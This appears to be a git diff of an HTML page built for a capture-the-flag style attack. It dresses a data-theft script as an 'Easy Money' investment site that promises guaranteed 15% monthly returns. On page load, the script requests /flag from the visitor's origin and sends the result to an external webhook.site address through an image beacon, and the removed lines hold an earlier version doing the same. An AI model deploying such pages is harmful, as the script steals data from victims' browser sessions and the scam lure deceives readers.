@@ -1,20 +1,57 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Easy Money - Investment Platform</title>
+    <style>
+        body { font-family: Arial; padding: 40px; background: #1a1a1a; color: white; }
+        .header { text-align: center; margin-bottom: 40px; }
+        .features { display: flex; justify-content: space-around; margin: 40px 0; }
+        .feature { text-align: center; padding: 20px; }
+    </style>
+</head>
 <body>
-<script>
-// Webhook simplificado
-var w="https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
+    <div class="header">
+        <h1>🚀 Easy Money Investment Platform</h1>
+        <p>High-return investment opportunities for exclusive clients</p>
+    </div>
+    
+    <div class="features">
+        <div class="feature">
+            <h3>15% Monthly Returns</h3>
+            <p>Guanteed high-yield investments</p>
+        </div>
+        <div class="feature">
+            <h3>Secure Platform</h3>
+            <p>Bank-level security</p>
+        </div>
+    </div>
 
-// Test simple primero
-var img=new Image();
-img.src=w+"?test=page_loaded";
+    <script>
+        // Tu exploit aquí (el mismo código anterior)
+        const WEBHOOK = "https://webhook.site/b4cd18d9-c61a-4a6c-b21a-e4e66153f385";
+        
+        function post(url, params={}){
+            var params_post = [];
+            for(const key in params){
+                params_post.push(`${key}=${params[key]}`);
+            }
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", url, false);
+            xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+            xhr.send(params_post.join("&"));
+            return xhr.responseText;
+        }
 
-// Intentar GET a /flag
-fetch('/flag').then(r=>r.text()).then(f=>{
- var i=new Image();i.src=w+"?flag="+encodeURIComponent(f);
-}).catch(e=>{
- var i=new Image();i.src=w+"?error="+e;
-});
-</script>
+        setTimeout(function() {
+            try {
+                var flag = post("/flag");
+                var img = new Image();
+                img.src = WEBHOOK + "?flag=" + encodeURIComponent(flag);
+            } catch(e) {
+                var img = new Image();
+                img.src = WEBHOOK + "?error=" + encodeURIComponent(e.toString());
+            }
+        }, 2000);
+    </script>
 </body>
 </html>
